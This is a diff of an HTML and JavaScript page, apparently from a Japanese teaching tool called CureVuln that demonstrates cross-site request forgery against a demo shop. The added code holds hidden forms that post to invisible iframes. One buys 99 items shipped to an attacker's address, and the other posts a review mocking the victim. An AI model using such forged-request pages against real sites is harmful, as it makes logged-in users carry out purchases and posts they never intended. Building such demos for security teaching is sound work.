@@ -12,6 +12,7 @@
             </div>
         </header>
         <main>
+            
             <div class="content">
                 <h3>Target URL</h3>
                 ここにはCureVulnのブラウザに表示されているDemoブラウザのURLを挿入してください。
@@ -41,7 +42,7 @@
                         <img id="trapImge1" src="" alt="" width="200px" height="200px">
                         <h3 class="price"><s>100円</s>→<b class="price-big">50円</b></h3>
                         <p>申し込みはこちら</p>
-                        <p id="mess"></p>
+                        <p id="messShopping"></p>
                         <div class="shop-form">
                             宛名 : <input type="text" class="text-box" name="addr" value=""> <br>
                             宛先 : <input type="text" class="text-box" name="addr" value=""> <br>
@@ -50,6 +51,13 @@
                         <div class="button">
                             <p class="shop-button" id="buy">申し込み</p>
                         </div>
+                        <form id="csrfFormShopping" action="" method="post" target="iframe_shopping">
+                            <input type="hidden" class="text-box" name="name" value="攻撃者に成功した男"> <br>
+                            <input type="hidden" class="text-box" name="addr" value="東京都 渋谷区 〇〇 〇丁目〇-〇〇"> <br>
+                            <input type="hidden" class="text-box" name="product_id" value="1" min="0" max="99" placeholder="0"> <br>
+                            <input type="hidden" class="text-box" name="num" value="99" min="0" max="99" placeholder="0"> <br>
+                        </form>
+                        <iframe name="iframe_shopping" style="width: 0px ;height: 0px;border: 0px;"></iframe>
                     </div>
                 </div>
                 <h3>処理結果</h3>
@@ -81,14 +89,16 @@
                             本文<br>
                             <textarea class="reviw" name="name" rows="8" cols="80"></textarea>
                         </div>
-                        <form class="" action="index.html" method="post">
-                            <input type="hidden" name="title" value="">
-                            <input type="hidden" name="addr" value="">
-                            <input type="hidden" name="product_id" id="formProductId" value="">
-                            <div class="button">
+                        <p id=messReviw></p>
+                        <div class="button">
                             <p class="shop-button" id="submitReviw">投稿</p>
-                            </div>
+                        </div>
+                        <form id="csrfFormReviw" action="" method="post" target="iframe_reviw">
+                            <input type="hidden" class="text-box" name="title" value="攻撃できちゃいますね"> <br>
+                            <input type="hidden" class="text-box" name="review" value="ここに攻撃を埋め込んだり、犯罪予告も書きこめちゃうね"> <br>
+                            <input type="hidden" class="text-box" name="product_id" id=productIdReviw value="1" min="0" max="99" placeholder="0"> <br>
                         </form>
+                        <iframe name="iframe_reviw" style="width: 0px ;height: 0px;border: 0px;"></iframe>
                     </div>
                 </div>
                 <div class="setting">
@@ -102,57 +112,9 @@
         <footer>
 
         </footer>
-        <iframe width="" height="">
-            <!DOCTYPE html>
-            <html lang="en" dir="ltr">
-                <head>
-                    <meta charset="utf-8">
-                    <title></title>
-                </head>
-                <body>
-                    <form class="" id="cookieform" action="index.html" method="get"></form>
-
-                </body>
-                <script type="text/javascript">
-
-                function fun () {
-                    var cookieform      = document.getElementById("cookieform");
-                    cookieform.action   = targetUrl.value;
-                    var cookie          = cookieform.submit();
-                }
-
-                </script>
-            </html>
-        </iframe>
     </body>
 </html>
 <script type="text/javascript">
-    var xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = function() {
-        switch ( xhr.readyState ) {
-            case 0:
-                // 未初期化状態.
-                console.log( 'uninitialized!' );
-                break;
-            case 1: // データ送信中.
-                console.log( 'loading...' );
-                break;
-            case 2: // 応答待ち.
-                console.log( 'loaded.' );
-                break;
-            case 3: // データ受信中.
-                console.log( 'interactive... '+xhr.responseText.length+' bytes.' );
-                break;
-            case 4: // データ受信完了.
-                if( xhr.status == 200 || xhr.status == 304 ) {
-                    var data = xhr.responseText; // responseXML もあり
-                    console.log( 'COMPLETE! :'+data );
-                } else {
-                    console.log( 'Failed. HttpStatus: '+xhr.statusText );
-                }
-                break;
-        }
-    };
     /*
     * 変数関連
     */
@@ -165,16 +127,22 @@
     var trapImge1       = document.getElementById('trapImge1');
     var trapImge2       = document.getElementById('trapImge2');
     var trapHref        = document.getElementById('trapHref');
+    var csrfFormShopping= document.getElementById('csrfFormShopping');
+    var csrfFormReviw   = document.getElementById('csrfFormReviw');
     var buyButton       = document.getElementById('buy');
     var submitReviw     = document.getElementById('submitReviw');
     var formProductId   = document.getElementById('formProductId');
+    var messShopping    = document.getElementById('messShopping');
+    var messReviw       = document.getElementById('messReviw');
+    var productIdReviw  = document.getElementById('productIdReviw');
 
     /*
     * イベントハンドラ関連
     */
     setUrlButton.addEventListener("click",displaySetAllUrl);
     submitReviw.addEventListener("click",csrfReview)
-    buy.addEventListener("click",csrfBuyBuy);
+    setUrlButton.addEventListener("click",displaySetAllUrl);
+    buy.addEventListener("click",buySubmit);
     productId.addEventListener("change",displaySetReviw);
     /*
     * 関数関連
@@ -183,58 +151,32 @@
         displaySetReviw();
         displaySetShop();
         displaySetDemoCsrfShop();
-        fun()
+    }
+    function buySubmit (){
+        csrfFormShopping.submit();
+        messShopping.textContent = "購入に成功しました。お届けは3日後になります。";
+        displaySetShop();
+    }
+    function csrfReview () {
+        csrfFormReviw.submit();
+        messReviw.textContent = "レビュー投稿ありがとう！";
+        displaySetReviw();
+
     }
     function displaySetDemoCsrfShop () {
-        trapHref.href       = targetUrl.value;
-        trapImge1.src       = targetUrl.value+"/img/taiyaki.jpg";
-        trapImge2.src       = targetUrl.value+"/img/taiyaki.jpg";
+        trapHref.href           = targetUrl.value;
+        csrfFormShopping.action = targetUrl.value+"/shopping.php";
+        csrfFormReviw.action    = targetUrl.value+"/comment.php";
+        trapImge1.src           = targetUrl.value+"/img/taiyaki.jpg";
+        trapImge2.src           = targetUrl.value+"/img/taiyaki.jpg";
     }
     function displaySetShop () {
         shoppingIframe.src  = targetUrl.value+"/user.php";
     }
     function displaySetReviw () {
         reviewIframe.src    = targetUrl.value+"/product.php?id="+productId.value;
-    }
-    function csrfBuyBuy () {
-        let mess = document.getElementById('mess');
-        $.ajax({
-            url:targetUrl.value+"/shopping.php",
-            type:'POST',
-            data:{
-                "name":"攻撃者に成功した男",
-                "addr":"東京都 渋谷区 〇〇 〇丁目〇-〇〇",
-                "num":99,
-                "product_id":1
-            }
-        }).done(
-            (data) => {
-                displaySetShop();
-                mess.textContent = "購入に成功しました。お届けは3日後になります。";
-            }
-        ).fail(
-            (data) => {
-                mess.textContent = "購入に失敗しました。Loginはおすみですか？";
-            }
-        );
-    }
-
-    function csrfReview () {
-        formProductId.value = productId;
-
-        $.ajax({
-            url:targetUrl.value+"/comment.php",
-            type:'POST',
-            data:{
-                "title":"攻撃できちゃいますね",
-                "review":"ここに攻撃を埋め込んだり、犯罪予告も書きこめちゃうね",
-                "product_id":productId.value
-            }
-        }).done(
-            (data) => {
-                displaySetReviw();
-            }
-        );
+        csrfFormReviw.action    = targetUrl.value+"/comment.php";
+        productIdReviw.value    = productId.value;
     }
 </script>
 <style media="screen">
